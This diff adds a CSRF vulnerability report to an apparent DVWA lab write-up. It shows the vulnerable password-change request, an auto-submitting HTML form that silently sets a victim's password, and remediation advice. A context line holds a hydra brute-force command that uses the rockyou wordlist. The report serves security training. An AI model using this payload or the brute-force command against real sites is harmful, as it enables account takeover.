@@ -134,6 +134,45 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vu
 - Use of parameterized commands
 - Principle of least privilege
 
+# CSRF Vulnerability Report
 
+## Vulnerability Summary
+**Type**: Cross-Site Request Forgery (CSRF)  
+**Risk**: High  
+**Location**: DVWA Password Change Function  
+**Endpoint**: `http://localhost/vulnerabilities/csrf/`
+
+## Exploitation Proof
+
+### Vulnerable Request
+```
+GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change
+```
+
+### CSRF PoC
+```html
+<html>
+<body>
+    <form action="http://localhost/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="attacker123">
+        <input type="hidden" name="password_conf" value="attacker123">
+        <input type="hidden" name="Change" value="Change">
+    </form>
+    <script>document.forms[0].submit();</script>
+</body>
+</html>
+```
+
+## Impact
+- Unauthorized password change for authenticated users
+- Full account takeover
+- No user interaction required
+
+## Remediation
+- Implement CSRF tokens
+- Change GET to POST for state-changing operations
+- Add SameSite cookies and referrer validation
+
+---
 
 
